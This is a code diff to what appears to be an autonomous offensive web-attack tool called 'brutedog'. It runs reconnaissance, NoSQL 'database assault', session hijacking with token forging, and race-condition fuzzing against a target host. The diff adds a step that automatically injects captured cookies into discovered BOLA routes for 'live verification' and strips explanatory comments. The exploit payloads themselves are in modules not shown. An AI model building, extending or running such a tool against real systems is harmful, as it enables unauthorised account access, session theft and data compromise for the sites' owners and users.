@@ -8,6 +8,7 @@ Features:
 - Live autonomous test-account session propagation across exploit modules
 - Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
 - HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
+- Live on-screen login verification and session injection feedback
 - Zero-disk in-memory intelligence collection & live telemetry streaming
 """
 import asyncio
@@ -27,6 +28,7 @@ from modules.crawler import crawl_target
 from modules.db_assault import run_nosql_assault
 from modules.session_hijack import run_session_hijack
 from modules.race_condition import run_race_condition_test
+from modules.live_login_verifier import execute_live_login_verification
 from modules.telemetry import stream_proof
 
 # ============================================================
@@ -156,7 +158,6 @@ def classify_and_adapt(response, current_payload, endpoint="", fingerprinter=Non
     findings = []
     mutated_payloads = []
 
-    # Use ResponseFingerprinter to filter out soft 404s and false positives
     if fingerprinter:
         is_fp, fp_reason = fingerprinter.is_false_positive(status, body, headers)
         if is_fp:
@@ -307,12 +308,10 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         
     start = time.monotonic()
     
-    # Initialize Centralized Secure Transport Wrapper & Persistent Session Pool
     transport = SecureTransport(target_url)
     session_pool = PersistentSessionPool(base_url=target_url, verify_ssl=False, http2=True)
     fingerprinter = ResponseFingerprinter()
 
-    # Capture a 404 baseline to feed into the response differential fingerprinter
     try:
         f_status, f_headers, f_body = transport.request("GET", "/brutedog-nonexistent-baseline-404")
         fingerprinter.capture_baseline("soft_404", f_status, f_body, f_headers)
@@ -320,7 +319,6 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     except Exception:
         pass
 
-    # 0. Stateful State-Machine Crawling & Reconnaissance
     section("STATEFUL STATE-MACHINE MAPPING & RECON")
     recon_data = {}
     discovered_paths = []
@@ -349,6 +347,15 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
     if bola_vulnerabilities:
         warning(f"Discovered {len(bola_vulnerabilities)} pre-validated BOLA / State-Skipping routes!")
+        
+        # AUTOMATED LIVE VERIFICATION OF DISCOVERED BOLA ROUTES
+        section("LIVE BOLA / STATE-SKIPPING VERIFICATION ASSAULT")
+        for bola_route in bola_vulnerabilities:
+            execute_live_login_verification(
+                target_url=target_url,
+                endpoint=bola_route,
+                cookie_dict=dict(transport.cookie_jar) if transport.cookie_jar else None
+            )
 
     section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
     all_results = []
@@ -370,19 +377,16 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
         except Exception as exc:
             error(f"Endpoint worker failed: {exc}")
 
-    # 1. Aggressive Database Assault
     try:
         await run_nosql_assault(target_url, port=port, use_ssl=secure)
     except Exception as exc:
         error(f"Database assault failed: {exc}")
 
-    # 2. Session Hijacking & Token Forging
     try:
         await run_session_hijack(target_url, port=port, use_ssl=secure)
     except Exception as exc:
         error(f"Session hijack failed: {exc}")
 
-    # 3. High-Concurrency HTTP/2 Single-Packet Race Condition Fuzzing
     try:
         await run_race_condition_test(
             target_url, 
